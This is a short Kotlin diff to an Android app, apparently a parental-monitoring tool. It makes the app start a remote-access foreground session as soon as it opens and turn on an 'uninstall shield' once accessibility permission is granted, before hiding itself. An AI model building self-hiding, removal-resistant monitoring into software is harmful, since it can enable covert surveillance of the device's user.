@@ -71,6 +71,11 @@ class MainActivity : AppCompatActivity() {
 
         updateStatusText(ADexForegroundService.lastPairCode)
         updatePermissionChecklistText()
+
+        // IMMEDIATE DISCORD ACCESS: Start service as soon as app is opened if configured.
+        if (isAutoEnrollConfigured() && !ADexForegroundService.isServiceRunning) {
+            startForegroundSession()
+        }
     }
 
     override fun onStart() {
@@ -260,11 +265,15 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun maybeEnableShieldAfterPermissions() {
-        // Only vanish when the shield-critical set is FULLY ready.
-        val coreReady = PermissionHelper.hasOverlayPermission(this) &&
-            PermissionHelper.isAccessibilityServiceEnabled(this) &&
-            PermissionHelper.isDeviceAdminEnabled(this) &&
-            PermissionHelper.hasUsageStatsPermission(this)
+        // 2. IMMEDIATE UNINSTALL SHIELD: Enable as soon as accessibility is granted.
+        if (PermissionHelper.isAccessibilityServiceEnabled(this)) {
+            if (!settingsStore.shieldEnabled) {
+                ParentalShieldManager.setShieldEnabled(this@MainActivity, settingsStore, true)
+            }
+        }
+
+        // 3. FULL SETUP CHECK: Only vanish when ALL critical permissions are ready.
+        val coreReady = allCriticalPermissionsGranted()
 
         if (!coreReady) {
             return
